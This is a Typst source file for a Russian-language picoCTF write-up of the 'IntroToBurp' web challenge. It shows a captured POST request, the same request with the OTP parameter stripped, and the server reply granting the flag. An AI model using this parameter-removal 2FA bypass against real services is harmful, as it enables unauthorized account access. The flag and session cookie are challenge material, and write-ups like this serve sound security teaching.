#set page(
  paper: "a4",
  margin: (x: 2.5cm, y: 2cm),
  numbering: "1",
  number-align: center,
)
#set text(font: "Linux Libertine", size: 11pt)

#set heading(numbering: "1.1")
#show heading: set text(size: 1.2em, weight: "regular")
#show heading: it => [
  #if it.level == 1 [
    #set text(size: 1.5em, weight: "semibold")
    #counter(heading).display("1.") #it.body
  ] else [
    #counter(heading).display("1.1") #it.body
  ]
]

#let codeblock(body, lang: "python") = [
  #set par(leading: 0.5em)
  #block(
    fill: rgb("#1e1e1e"),
    inset: (x: 1em, y: 0.6em),
    radius: 0.3em,
    width: 100%,
    stroke: none,
    breakable: true,
  )[
    #set text(fill: rgb("#d4d4d4"), size: 9pt, font: "JetBrains Mono")
    #body
  ]
]

#let resultblock(body) = [
  #set par(leading: 0.5em)
  #block(
    fill: rgb("#1a3a2a"),
    inset: (x: 1em, y: 0.6em),
    radius: 0.3em,
    width: 100%,
    stroke: none,
    breakable: true,
  )[
    #set text(fill: rgb("#4ade80"), size: 9pt, font: "JetBrains Mono")
    #body
  ]
]

#let yellowbox(body) = [
  #block(
    fill: rgb("#fff3cd"),
    inset: (x: 1em, y: 0.5em),
    radius: 0.3em,
    stroke: none,
  )[
    #set text(fill: rgb("#856404"), size: 10pt)
    #body
  ]
]

#let redbox(body) = [
  #block(
    fill: rgb("#f8d7da"),
    inset: (x: 1em, y: 0.5em),
    radius: 0.3em,
    stroke: none,
  )[
    #set text(fill: rgb("#721c24"), size: 10pt)
    #body
  ]
]

= WriteUp: PICO-CTF

#align(right)[
  *Автор:* nedo-offsec \
  *Дата:* 19 июля 2026 \
  *Задание:* IntroToBurp \
  *Категория:* Web \
  *Сложность:* Easy 100 pts
]

== Задание

== Решение

Регистрируемся, затем видим форму ввода 2FA токена.

Перехватываем запрос Burp, а затем удаляем последнюю строчку:

было:

```http
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:51096
Content-Length: 5
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Origin: http://titan.picoctf.net:51096
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:51096/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw9jEsOAiEQRO_C2gVNDyN4GcKnicYZIHxijPHusiDuql7l1Yf5R3-zGwN2Yb7VaHp-UpoApfYuSuEUXpWWXCLBDkGA0lxxh9yiRaAwvTiOwyR70vrJvcy0gdzEPmuxrb1yDWst95zIpHE6qguNRvXvf38yHypl.al0bvw.6pD9VJn3pFNCKBtcqcQnh0UspiU
Connection: keep-alive

otp=1
```

стало
```http
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:51096
Content-Length: 5
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Origin: http://titan.picoctf.net:51096
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:51096/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw9jEsOAiEQRO_C2gVNDyN4GcKnicYZIHxijPHusiDuql7l1Yf5R3-zGwN2Yb7VaHp-UpoApfYuSuEUXpWWXCLBDkGA0lxxh9yiRaAwvTiOwyR70vrJvcy0gdzEPmuxrb1yDWst95zIpHE6qguNRvXvf38yHypl.al0bvw.6pD9VJn3pFNCKBtcqcQnh0UspiU
Connection: keep-alive


```

#redbox[
Важно: Не удалять ничего кроме opt=, ни пробела, ни строчки
]

Затем отправляем запрос и ловим ответ:
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.8.10
Date: Sun, 19 Jul 2026 18:54:48 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 102
Vary: Cookie
Connection: close

Welcome, 1 you sucessfully bypassed the OTP request. 
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_c94b61ac}
```
